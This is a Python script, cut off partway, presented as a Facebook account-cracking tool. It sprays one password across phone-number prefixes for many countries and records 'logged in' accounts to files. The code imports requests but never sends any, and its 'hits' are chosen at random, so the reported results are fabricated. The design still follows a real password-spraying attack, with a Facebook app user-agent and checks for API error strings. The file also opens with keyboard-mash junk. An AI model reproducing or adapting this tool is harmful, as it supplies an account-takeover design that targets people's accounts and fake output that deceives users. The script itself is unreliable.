#jgdbfarhhteitekgrkyykegkkyryjgdbfarhhteitekgrkyykegkkyrykrykjtrkrkgkrmgrkgrgkkgkyjrtktiryrofififi4uocoycofogo9oofocoocococ97 9c7997c97 4997c9c9c9ricioro999cycofio oooooucoci ooytkrykjtrkrkgkrmgrkgrgkkgkyjrtktiryrofififi4uocoycofogo9oofocoocococ97 9c7997c97 4997c9c9c9ricioro999cycofio oooooucoci ooyt



import sys,os,time,random
from datetime import datetime

try:
    
    import requests
    from termcolor import colored
    
    
    plan=colored('Demo','blue')
    HEADERS = {'User-Agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'}
    equal='#'
    ranged=['0','1','2','3','4','5','6','7','8','9']
    #print(colored('Everything is Ok','red'))
    banner=colored('''Coded by Josif (DEMO)
           ▓█████▄ ▓█████  ██▒   █▓ ██▓ ██▓    
           ▒██▀ ██▌▓█   ▀ ▓██░   █▒▓██▒▓██▒    
	   ░██   █▌▒███    ▓██  █▒░▒██▒▒██░    
	   ░▓█▄   ▌▒▓█  ▄   ▒██ █░░░██░▒██░    
	   ░▒████▓ ░▒████▒   ▒▀█░  ░██░░██████▒
	    ▒▒▓  ▒ ░░ ▒░ ░   ░ ▐░  ░▓  ░ ▒░▓  ░
	    ░ ▒  ▒  ░ ░  ░   ░ ░░   ▒ ░░ ░ ▒  ░
	    ░ ░  ░    ░        ░░   ▒ ░  ░ ░   
 ██▓     ▒█████   ▄▄▄      ▓█████▄  ██▓ ███▄    █   ▄████ 
▓██▒    ▒██▒  ██▒▒████▄    ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██░    ▒██░  ██▒▒██  ▀█▄  ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
▒██░    ▒██   ██░░██▄▄▄▄██ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓
░██████▒░ ████▓▒░ ▓█   ▓██▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒
░ ▒░▓  ░░ ▒░▒░▒░  ▒▒   ▓▒█░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
░ ░ ▒  ░  ░ ▒ ▒░   ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░ 
  ░ ░   ░ ░ ░ ▒    ░   ▒    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
    ░  ░    ░ ░        ░  ░   ░     ░           ░       ░ ''','red')
    
    def Loggef():
        
        ind=["+919932", "+917799", "+919416", "+917895", "+919131", "+918103", "+919391", "+918281", "+918805", "+919432", "+917818", "+919510", "+918160", "+918727", "+919555", "+918110", "+918106" ]
        us=["+151330", "+171933", "+181523", "+171757", "+171492", "+181523", "+171757", "+171350"]
        chin=["+861708", "+861708", "+861657", "+861650", "+861333", "+861650", "+861708", "+861657", "+861675", "+861555", "+861855", "+861716", "+861653", "+861651", "+861652", "+861652", "+861651", "+861651", "+861651", "+861651"]
        indo=["+628137", "+628123", "+628123", "+628154"]
        bra=["+559551", "+558198", "+556499", "+553198", "+556498", "+559551", "+559559"]
        mex=["+528113", "+528125", "+528120", "+528121", "+528115", "+528128", "+523316", "+524427", "+526476" ]
        phil=["+639517", "+639127", "+639502", "+639663" ]
        vt=['+845860','+843677','+843674']
        thai=["+669183", "+669611", "+666358", "+669566", "+669459", "+666182", "+669857", "+669933", "+669518", "+666462", "+669569", "+669913", "+666567", "+669882", "+669454", "+669732", "+666122", "+666105", "+669356" ]
        eg=["+203741"]
        bd=["+880175", "+880163", "+880182", "+880172", "+880193", "+880178", "+880178", "+880197", "+880183", "+880178", "+880168", "+880184", "+880179", "+880173", "+880174", "+880192", "+880174", "+880164" ]
        pak=["+923355", "+923055", "+923048", "+923048", "+923017", "+923145", "+923389", "+923692"]
        colom=["+576493"]
        uk=["+447399", "+447823", "+447709", "+447752", "+447716", "+447365", "+447752", "+447944", "+447716", "+447537", "+447901", "+447716", "+447752", "+447752", "+447752", "+447901", "+447365", "+447950", "+447752", "+447562"]
        rus=["+795174", "+796256", "+790930", "+790687", "+790334", "+796006", "+790246", "+791209", "+791209", "+791549", "+790246", "+791209", "+798551", "+790246", "+790456"]
        turk=["+905033", "+905016"]
        fr=["+337521", "+337571", "+337571", "+337571", "+337571", "+337571", "+337571", "+337571", "+337571", "+337571", "+337571", "+337571", "+337521", "+337571", "+337521", "+337581", "+337521", "+337521", "+337521", "+337541"]
        arg=["+541593", "+541573"]
        ital=["+393399", "+393135", "+393341", "+393510"]
        nig=["+234815"]
        germ=["+491514", "+491577", "+491523" ]
        mal=["+601053", "+601054", "+601349", "+601128", "+601128", "+601128", "+601128", "+601121", "+601128", "+601128", "+601128", "+601077", "+601161", "+601117"]
        
        
        
        
        
        def Attack1():
            
            def Country():
                
                
                os.system('clear')
                print(banner)
                col1=['red','blue','yellow','green','cyan']
                color1=random.choice(col1)
                print(colored(f'''{59*equal}\n{59*equal}
                [01]     India
                [02]     United States
                [03]     China
                [04]     Indonesia
                [05]     Brazil
                [06] Mexico
                [07] Philippines
                [08] Vietnam
                [09]         Thailand
                [10]    Egypt
                [11]            Bangladesh
                [12]            Pakistan
                [13]        Colombia
                [14]    United Kingdom
                [15]    Russia
                [16]    Turkey
                [17]            France
                [18]            Argentina
                [19]        Italy
                [20]        Nigeria
                [21]    Germany
                [22]    Malaysia\n{59*equal}\n[00] Back Menu\n{59*equal}''',f'{color1}'))
                C=colored('Country','red',attrs=['bold'])
                CC=input(f'{C}>>')
                if CC=='00':
                    time.sleep(0.5)
                    Level()
                col3=['red','blue','yellow','green','cyan','white']
                color3=random.choice(col3)
                CP=colored('PASSEORD','cyan',attrs=['bold'])
                PAS=input(f'{CP}: ')
                if len(PAS)<6:
                    print(colored('[*] PASSWORD MUST BE SIX CHARECTERS OR MORE.','red'))
                    time.sleep(1)
                    Country()
                
                def IND():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('India',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(ind)
                                n2=random.randint(100000,999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)
                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER} == {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def US():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Slow','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('United State',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(us)
                                n2=random.randint(10000,99999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def CHIN():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('China',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(chin)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def INDO():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Indonesia',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(indo)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
                                #elif "Regain access by updating the app or logging in from a mobile or web browser" in result:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']))
                                    #pass
                                
                                elif "Calls to this api have exceeded the rate limit. (613)" in result:
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[+]",colored("Login limitation blocked you¡ / Disable VPN","yellow"),c)
                                    pass
                                else:
                                    pass
                            
                            logs=open('.logs','r').read().split()
                            broken=open('.broken','r').read().split()
                            countlogs=[colored(f"\n[==] Scanning Completed! \n[+] Total Accounts Scanned: {r}\n[+] Total Accounts Found: {len(logs)} \n[+] Active Accounts: {int(r)-int(len(broken))}\n[+] Broken: {len(broken)}\n","red")]
                            time.sleep(1)
                            for vv in countlogs:
                                
                                for v in vv:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(v,end='')
                                    sys.stdout.flush()
                            open('.logs','w')
                            open('.broken','w')
                            input('\nEnter To Back Menu>>')
                            time.sleep(0.5)
                    RANGE()
                    
                    Country()
                def BRA():
                    open('.logs','w')
                    open('.broken','w')
                    net1=['Low','Good','Better','High','Poor','Not Bad']
                    net2=random.choice(net1)
                    net=colored(f'{net2}',f'{color1}')
                    col2=['red','blue','yellow','green','cyan','white']
                    color2=random.choice(col2)
                    rr=colored('range',f'{color2}',attrs=['bold'])
                    def RANGE():
                        r=input(f'{rr}>>')
                        if not r.startswith(tuple(ranged)) or not r.endswith(tuple(ranged)):
                            print(colored('Range: Only numeric digits are allowed','red'))
                            RANGE()
                        else:
                            S1=colored('Brazil',f'{color3}',attrs=['bold'])
                            stop=colored('^Cancel/Stop Attack <Ctrl+C> or ^Exit App <Ctrl+Z>','red')
                            Scan=[f'[+] Checking Network: {net} \n[+] Country No:<{CC}>\n[+] Scanning: {S1}\n[+] Plan: {plan}\n[+] Total Accounts Scanning:<{r}> \n{59*equal}\n[+] Starting Attack...\n[+] {stop}\n']
                            for iii in Scan:
                                
                                for ii in iii:
                                    #col4=['red','blue','green']
                                    #ccc=random.choice(col4)
                                    #coloredii=colored(f'{ii}',f'{ccc}')
                                    time.sleep(0.07)
                                    print(ii,end='')
                                    sys.stdout.flush()
                            c=0
                            for i in range(int(r)):
                                c += 1
                                n1=random.choice(bra)
                                n2=random.randint(1000000,9999999)
                                
                                USER=n1+'xxxxxxxx'
                                PASS=PAS
                                #print(ua, len(ua))
                                
                                url=random.randint(1,3)                                
                                result='' #
                                
                                if url==3:
                                    #print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    open('.broken','a').write(f'{USER}  ')
                                    print("[",colored(f"{datetime.now()}","blue"),"]",colored("Searching For Accounts¡ ","white",attrs=['bold']), len(USER),c)
                                    pass
                                elif "Login approvals are on. Expect an SMS shortly with a code to use for log in (406)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" 2FA Verify ","green",attrs=['bold']),c)
                                    saved=f"      {USER}     {PASS}"
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedIn2FA","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif url==1:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored("Logged In","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS} Remaining 14days"
                                    f=open("LoggedIn","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                
                                elif "Account Restricted" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Restricted Account","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}"
                                    f=open("LoggedInRestricted","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                    
                                elif "User must confirm their e-mail address on www.facebook.com (407)" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" NEW ID ","green",attrs=['bold']),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    saved=f"      {USER}     {PASS}    "
                                    f=open("LoggedInNEW","a")
                                    f.write(str(f"\n{saved}"))
                                    pass
                                elif url==2:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} != {PASS}",colored("Incorrect","red",attrs=["bold"]),c)
                                    f=open("ValidPHONENumbersList","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                elif "uid" in result:
                                    print("[",colored(f"{datetime.now()}","blue"),"]",f"{USER} == {PASS}",colored(" Locked ID","green",attrs=["bold"]),c)
                                    open('.logs','a').write(f'{USER}  ')
                                    f=open("LoggedInLockedID","a")
                                    f.write(str(f"\n{USER}   ==   {PASS}"))
                                    pass
                                
